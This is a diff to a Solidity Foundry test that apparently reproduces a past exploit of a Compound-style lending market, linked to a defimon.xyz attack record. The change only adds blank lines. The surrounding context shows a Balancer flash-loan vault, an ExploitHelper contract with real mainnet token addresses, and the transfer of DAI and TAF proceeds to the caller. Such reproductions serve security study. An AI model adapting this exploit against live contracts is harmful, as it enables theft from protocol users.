@@ -14,6 +14,7 @@ import "./../interface.sol";
 // https://defimon.xyz/attack/mainnet/0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4
 
 interface ICErc20Immutable {
+
     function borrow(uint256 borrowAmount) external returns (uint256);
 
     function borrowBalanceStored(address account) external view returns (uint256);
@@ -23,9 +24,11 @@ interface ICErc20Immutable {
         uint256 repayAmount,
         address cTokenCollateral
     ) external returns (uint256);
+
 }
 
 interface IComptroller {
+
     function liquidateCalculateSeizeTokens(
         address cTokenBorrowed,
         address cTokenCollateral,
@@ -33,9 +36,11 @@ interface IComptroller {
     ) external view returns (uint256, uint256);
 
     function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
+
 }
 
 contract ContractTest is Test {
+
     IBalancerVault private constant Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     IERC20 private constant TAF = IERC20(0xf573E6740045b5387F6d36a26B102C2adF639af5);
@@ -104,9 +109,11 @@ contract ContractTest is Test {
             }
         }
     }
+
 }
 
 contract ExploitHelper {
+
     ICErc20Immutable private constant kDAI = ICErc20Immutable(0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769);
     ICErc20Delegate private constant kTAF = ICErc20Delegate(payable(0xf5140fC35C6f94D02d7466f793fEB0216082d7E5));
     IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
@@ -136,4 +143,5 @@ contract ExploitHelper {
         DAI.transfer(msg.sender, amountDAI);
         TAF.transfer(msg.sender, amountTAF);
     }
+
 }
